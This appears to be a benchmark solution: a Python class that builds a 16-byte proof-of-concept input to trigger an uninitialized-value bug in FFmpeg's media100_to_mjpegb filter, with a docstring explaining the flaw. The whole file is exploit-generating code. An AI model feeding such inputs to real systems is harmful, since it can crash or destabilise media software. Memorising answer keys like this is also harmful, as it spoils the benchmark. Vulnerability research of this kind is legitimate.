import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers the Uninitialized Value
        vulnerability in the bsf/media100_to_mjpegb module of FFmpeg.

        The vulnerability occurs because the filter, when processing a Media 100
        video chunk, correctly resizes the packet's logical size (`pkt->size`)
        but fails to zero out the trailing data from the original, larger packet
        buffer. This leaves uninitialized data in the buffer's padding.

        To trigger this, we construct a packet with two chunks:
        1. A video chunk (`M100_DECO_VIDEO`). The filter will find and process this.
        2. A subsequent dummy chunk. The presence of this chunk makes the initial
           packet size larger than the final packet size.

        The minimal construction is two 8-byte chunks (the minimum size for a
        chunk, consisting of a 4-byte ID and a 4-byte size).
        - Input packet size: 8 (chunk1) + 8 (chunk2) = 16 bytes.
        - The filter processes chunk1. The header is converted from 8 bytes to 12 bytes.
        - Final packet size: (chunk1_size - 8) + 12 = (8 - 8) + 12 = 12 bytes.
        - The original 16-byte buffer now has a logical size of 12, leaving the
          last 4 bytes as uninitialized padding, which triggers the vulnerability
          when accessed.
        """

        # Media 100 video chunk identifier ('M1VI' big-endian)
        M100_DECO_VIDEO = 0x4d315649

        # Chunk 1: A minimal video chunk (8-byte header, 0-byte data).
        # Sizes are packed as 32-bit big-endian integers.
        size_chunk1 = 8
        chunk1 = struct.pack('>II', M100_DECO_VIDEO, size_chunk1)

        # Chunk 2: A minimal dummy chunk to act as trailing data.
        dummy_id = 0
        size_chunk2 = 8
        chunk2 = struct.pack('>II', dummy_id, size_chunk2)

        # Concatenate the two chunks to form the final PoC.
        poc = chunk1 + chunk2
        return poc